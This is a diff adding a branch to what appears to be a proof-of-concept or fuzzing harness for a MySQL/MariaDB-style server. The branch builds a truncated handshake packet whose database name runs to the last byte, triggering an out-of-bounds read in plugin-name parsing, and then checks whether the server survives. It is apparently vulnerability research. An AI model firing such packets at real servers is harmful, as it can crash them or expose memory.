@@ -53,6 +53,33 @@ def case(total_len):
     caps = (CLIENT_PROTOCOL_41 | BASE_CAPS) & ~(
         CLIENT_CONNECT_WITH_DB | CLIENT_PLUGIN_AUTH |
         CLIENT_CONNECT_ATTRS | CLIENT_MYSQL)
+    if branch == "nextfield":
+        # The fourth consumer of the same root cause, and the one every real
+        # client's capability set reaches:
+        #   db_len= safe_strlen(db);
+        #   next_field= passwd + passwd_len + (db ? db_len + 1 : 0);
+        #   client_plugin= Lex_cstring_strlen(next_field);
+        # The guard only ensures passwd + passwd_len + 1 <= read_pos + pkt_len,
+        # so a *database* name running to the final byte puts next_field one
+        # past the terminator and Lex_cstring_strlen() scans out of the packet.
+        caps |= (CLIENT_SECURE_CONNECTION | CLIENT_CONNECT_WITH_DB |
+                 CLIENT_PLUGIN_AUTH)
+        hdr_and_user = 32 + 1 + 1 + 1          # header, user "u", NUL, authlen
+        db_len = total_len - hdr_and_user
+        if db_len < 1:
+            return "too short", True
+        pkt = (c.build_handshake_response(caps=caps, ext_caps=0, charset=45,
+                                          user=b"u", auth_data=b"", db=b"d" * db_len)
+               )[:total_len]
+        assert len(pkt) == total_len, (len(pkt), total_len)
+        try:
+            c.send_packet(pkt)
+            c.read_packet()
+        except OSError:
+            c.close()
+            return "closed", server_alive(HOST, PORT, 10.0)
+        c.close()
+        return "replied", True
     if branch == "strlen":        # !CLIENT_SECURE_CONNECTION -> NOTES 4.3
         caps &= ~CLIENT_SECURE_CONNECTION
     elif branch == "len1":        # one-byte auth length
